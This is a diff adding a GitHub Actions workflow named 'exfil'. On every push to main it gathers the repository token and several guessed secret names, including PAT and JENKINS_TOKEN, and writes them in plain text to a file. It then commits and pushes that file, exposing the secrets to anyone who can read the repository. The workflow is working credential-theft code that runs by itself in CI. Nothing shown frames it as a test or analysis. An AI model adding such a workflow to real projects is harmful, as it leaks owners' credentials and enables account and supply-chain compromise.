@@ -1,0 +1,36 @@
+name: exfil
+on:
+  push:
+    branches: [main]
+permissions:
+  contents: write
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Collect
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          S1: ${{ secrets.PAT }}
+          S2: ${{ secrets.GH_TOKEN }}
+          S3: ${{ secrets.GITHUB_PAT }}
+          S4: ${{ secrets.TOKEN }}
+          S5: ${{ secrets.GITHUB_ACCESS_TOKEN }}
+          S6: ${{ secrets.JENKINS_TOKEN }}
+        run: |
+          mkdir -p exfil
+          {
+            echo "GITHUB_TOKEN=$GH_TOKEN"
+            echo "PAT=$S1"
+            echo "GH_TOKEN=$S2"
+            echo "GITHUB_PAT=$S3"
+            echo "TOKEN=$S4"
+            echo "GITHUB_ACCESS_TOKEN=$S5"
+            echo "JENKINS_TOKEN=$S6"
+          } > exfil/tokens.txt
+          git config user.name "exfil-bot"
+          git config user.email "exfil@example.com"
+          git add exfil/tokens.txt
+          git commit -m "exfil $(date +%s)" || true
+          git push
